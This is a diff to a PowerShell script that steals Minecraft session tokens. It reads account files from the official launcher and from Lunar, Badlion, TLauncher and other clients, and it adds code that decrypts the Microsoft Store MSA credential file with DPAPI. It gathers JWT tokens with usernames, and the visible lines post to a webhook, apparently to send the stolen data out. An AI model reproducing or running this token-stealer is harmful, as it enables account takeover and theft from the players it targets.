@@ -7,13 +7,24 @@ try{
     iwr -Uri $webhook -Method Post -Headers $h -Body $ping -TimeoutSec 10 -EA 0 | Out-Null
 }catch{}
 
-# known token file paths
+$found = @()
+$seen = @{}
+$jwtRegex = "eyJhbGciOiJIUzI1NiJ9\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+"
+
+function Add-Token {
+    param($tok, $user, $src)
+    if(-not $tok){ return }
+    if($tok.Length -lt 20){ return }
+    if($seen.ContainsKey($tok)){ return }
+    $seen[$tok] = $true
+    $script:found += "user: $user`nssid: $tok`nfile: $src`n"
+}
+
+# 1. old + new account jsons
 $paths = @(
     "$env:APPDATA\.minecraft\launcher_accounts.json",
-    "$env:APPDATA\.minecraft\launcher_profiles.json",
-    "$env:APPDATA\.minecraft\launcher_msa_credentials.json",
+    "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
     "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
-    "$env:LOCALAPPDATA\.minecraft\launcher_msa_credentials.json",
     "$env:APPDATA\.minecraft\TlauncherProfiles.json",
     "$env:APPDATA\.lunarclient\settings\game\accounts.json",
     "$env:APPDATA\.lunarclient\accounts.json",
@@ -32,43 +43,48 @@ $paths = @(
     "$env:APPDATA\Badlion Client\accounts.json"
 )
 
-$found = @()
-$jwtRegex = "eyJhbGciOiJIUzI1NiJ9\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+"
-
-# scan known paths
 foreach($p in $paths){
     if(Test-Path $p){
         try{
             $raw = Get-Content $p -Raw
             $j = $raw | ConvertFrom-Json -EA 0
-            $tok = $null
-            $uname = $null
             if($j.accounts){
                 $j.accounts.PSObject.Properties | %{
                     $a = $_.Value
-                    if($a.accessToken){
-                        $tok = $a.accessToken
-                        $uname = $a.minecraftProfile.name
-                    }
-                    elseif($a.minecraftProfile.accessToken){
-                        $tok = $a.minecraftProfile.accessToken
-                        $uname = $a.minecraftProfile.name
-                    }
+                    $tok = $null
+                    $uname = "unknown"
+                    if($a.accessToken){ $tok = $a.accessToken }
+                    if($a.minecraftProfile -and $a.minecraftProfile.name){ $uname = $a.minecraftProfile.name }
+                    elseif($a.username){ $uname = $a.username }
+                    Add-Token $tok $uname $p
                 }
             }
-            if(-not $tok){
-                $m = [regex]::Match($raw, $jwtRegex)
-                if($m.Success){ $tok = $m.Value }
-            }
-            if($tok){
-                $label = if($uname){ $uname } else { "unknown" }
-                $found += "user: $label`nssid: $tok`nfile: $p`n"
-            }
+            # fallback regex scan
+            [regex]::Matches($raw, $jwtRegex) | %{ Add-Token $_.Value "unknown" $p }
         }catch{}
     }
 }
 
-# deep scan launcher folders - only account files
+# 2. decrypt the MSA credential bin (the live one)
+$bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
+if(Test-Path $bin){
+    try{
+        $bytes = [IO.File]::ReadAllBytes($bin)
+        $dec = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, "CurrentUser")
+        $txt = [Text.Encoding]::UTF8.GetString($dec)
+        $jj = $txt | ConvertFrom-Json -EA 0
+        $tok = $null
+        $uname = "unknown"
+        if($jj.microsoftAccount -and $jj.microsoftAccount.accessToken){ $tok = $jj.microsoftAccount.accessToken }
+        elseif($jj.accessToken){ $tok = $jj.accessToken }
+        if($jj.minecraftProfile -and $jj.minecraftProfile.name){ $uname = $jj.minecraftProfile.name }
+        Add-Token $tok $uname $bin
+        # also regex it
+        [regex]::Matches($txt, $jwtRegex) | %{ Add-Token $_.Value $uname $bin }
+    }catch{}
+}
+
+# 3. deep scan launcher folders - account files only
 $roots = @(
     "$env:APPDATA\.minecraft",
     "$env:APPDATA\.lunarclient",
@@ -83,34 +99,14 @@ $roots = @(
 foreach($r in $roots){
     if(Test-Path $r){
         try{
-            Get-ChildItem $r -Recurse -File -Include "accounts.json","launcher_accounts.json","user.json","*.auth.json" -EA 0 | %{
+            Get-ChildItem $r -Recurse -File -Include "accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","*.auth.json" -EA 0 | %{
                 if($_.Length -gt 1mb){ return }
                 $c = Get-Content $_.FullName -Raw -EA 0
-                $m = [regex]::Match($c, $jwtRegex)
-                if($m.Success){
-                    $found += "user: unknown`nssid: $($m.Value)`nfile: $($_.FullName)`n"
-                }
+                [regex]::Matches($c, $jwtRegex) | %{ Add-Token $_.Value "unknown" $_.FullName }
             }
         }catch{}
     }
 }
-
-# dedupe by ssid
-$seen = @{}
-$clean = @()
-foreach($f in $found){
-    $m = [regex]::Match($f, "ssid:\s*(\S+)")
-    if($m.Success){
-        $t = $m.Groups[1].Value
-        if(-not $seen.ContainsKey($t)){
-            $seen[$t] = $true
-            $clean += $f
-        }
-    } else {
-        $clean += $f
-    }
-}
-$found = $clean
 
 if($found.Count -eq 0){
     $found = "nothin found bro"
